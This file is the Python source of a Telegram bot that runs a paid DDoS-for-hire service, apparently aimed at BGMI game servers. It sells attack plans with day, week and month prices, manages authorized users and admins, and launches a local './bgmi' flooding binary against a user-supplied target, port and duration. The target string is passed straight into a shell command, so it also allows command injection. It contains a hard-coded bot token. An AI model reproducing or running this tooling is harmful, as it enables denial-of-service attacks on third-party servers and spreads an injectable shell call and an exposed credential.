#!/usr/bin/python3
# From @Noctis_SKY

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7419053950:AAEJY7FabJ9PaBKZ48b-RmrjSsGLLyBVKJg')

# Admin user IDs
admin_id = ["1805263007"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"✅ User {user_to_add} added successfully."
            else:
                response = "⚠ User already exists."
        else:
            response = "❗ Please specify a user ID to add."
    else:
        response = "🚫 Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"✅ User {user_to_remove} removed successfully."
            else:
                response = f"⚠ User {user_to_remove} not found in the list."
        else:
            response = '''❗ Please specify a user ID to remove.
Usage: /remove <userid>'''
    else:
        response = "🚫 Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "✅ Logs cleared successfully."
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "🚫 Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "👥 Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "🚫 Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "🚫 Only admin can run this command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🆔 Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"🔫 {username}, ATTACK STARTED.\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏱ Time: {time} seconds\n🔧 Method: BGMI\nFrom @Noctis_SKY"
    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 5000:
                response = "⚠ Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 110"
                subprocess.run(full_command, shell=True)
                response = f"✅ BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "❗ Usage: /bgmi <target> <port> <time>\nFrom @Noctis_SKY"  # Updated command syntax
    else:
        response = "🚫 You are not authorized to use this command.\nFrom @Noctis_SKY"

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "📜 Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "🚫 You are not authorized to use this command."

    bot.reply_to(message, response)

# Function to display available commands
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = '''📜 Available commands:
 /bgmi : Method for BGMI servers.
 /rules : Please check before use!
 /mylogs : To check your recent attacks.
 /plan : Check out our botnet rates.

📜 To see admin commands:
 /admincmd : Shows all admin commands.
From @Noctis_SKY
'''
    if str(message.chat.id) in admin_id:
        for handler in bot.message_handlers:
            if hasattr(handler, 'commands'):
                if handler.doc and 'admin' in handler.doc.lower():
                    help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🎉 Welcome to Your Home, {user_name}! Feel free to explore.\nTry running this command: /help\nWelcome to the world's best DDoS bot\nFrom @Noctis_SKY"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''⚠ {user_name}, please follow these rules:

1. Don't run too many attacks, or you'll get banned from the bot.
2. Don't run 2 attacks at the same time, or you'll get banned from the bot.
3. We check the logs daily, so follow these rules to avoid a ban!!
From @Noctis_SKY'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''💡 {user_name}, here's our powerful plan:

VIP:
- Attack Time: 200 seconds
- After Attack Limit: 2 minutes
- Concurrent Attacks: 300

💵 Price List:
- Day: 150 Rs
- Week: 900 Rs
- Month: 1600 Rs
From @Noctis_SKY
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = f'''🔐 Admin Commands:

/add <userId> : Add a user.
/remove <userid> : Remove a user.
/allusers : Authorized users list.
/logs : All users' logs.
/broadcast : Broadcast a message.
/clearlogs : Clear the logs file.
/promote <userId> : Promote a user to admin.
From @Noctis_SKY
'''
    else:
        response = "🚫 You are not authorized to view admin commands."
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "📢 Message to all users by Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "✅ Broadcast message sent successfully to all users."
        else:
            response = "❗ Please provide a message to broadcast."
    else:
        response = "🚫 Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['promote'])
def promote_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_promote = command[1]
            if user_to_promote in allowed_user_ids and user_to_promote not in admin_id:
                admin_id.append(user_to_promote)
                response = f"✅ User {user_to_promote} promoted to admin successfully."
            else:
                response = "⚠ User not found or already an admin."
        else:
            response = "❗ Please specify a user ID to promote."
    else:
        response = "🚫 Only admin can run this command."

    bot.reply_to(message, response)

bot.polling()
# From @Noctis_SKY
